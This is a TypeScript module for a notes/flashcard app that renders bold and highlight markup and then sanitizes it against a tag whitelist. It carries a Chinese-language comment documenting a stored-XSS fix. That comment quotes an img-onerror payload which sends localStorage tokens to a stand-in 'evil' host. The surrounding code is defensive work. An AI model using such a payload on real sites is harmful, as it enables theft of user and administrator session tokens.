import { sanitizeCardHtml } from './sanitizeHtml';

/**
 * 渲染笔记中的标记语法：
 * - **text** → <strong>text</strong>
 * - ==text== → <mark class="highlight">text</mark>
 *
 * 【2026-09-12 安全修复】
 * 原实现只做正则替换、不做任何净化，返回值被 8 处 dangerouslySetInnerHTML
 * 直接注入（StudyPageV2 / ReviewPageV2 / DecksPageV2 / AdminCardsPage /
 * ImmersiveQuiz）。而输入来自「用户可自建的笔记字段」，因此在笔记里写入
 * `<img src=x onerror="fetch('//evil/'+localStorage.token)">` 即可执行脚本；
 * 管理端 AdminCardsPage 同样渲染笔记字段，可升级为窃取管理员 token 的存储型 XSS。
 *
 * 修复方案：**白名单净化，而不是整体转义**。
 * 之所以不能整体转义 —— 库中已有 576 条笔记的字段含服务端 renderTemplate
 * 生成的 <b> 标签，整体转义会让它们把 <b> 当纯文本显示出来（已实测确认）。
 * 因此这里走 sanitizeCardHtml：放行 b/strong/mark/br/span 等已知安全标签与
 * 白名单 class，其余标签剥壳、属性一律丢弃。
 *
 * 注意顺序：先做标记替换（产出 <strong>/<mark>），再净化 —— 顺序不能颠倒。
 *
 * 性能：净化走 DOMParser，单次约 0.1ms 量级；但卡片列表/答题界面会在渲染循环里
 * 反复调用同一批字符串，故加一层小型结果缓存。
 */
const cache = new Map<string, string>();
const CACHE_MAX = 600;

export function renderMarkup(text: string): string {
  if (!text) return '';

  const hit = cache.get(text);
  if (hit !== undefined) return hit;

  const withMarkup = text
    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
    .replace(/==(.+?)==/g, '<mark class="highlight">$1</mark>');

  const out = sanitizeCardHtml(withMarkup);

  if (cache.size >= CACHE_MAX) cache.clear();
  cache.set(text, out);
  return out;
}

/** 仅供测试/调试：清空渲染缓存 */
export function clearMarkupCache(): void {
  cache.clear();
}
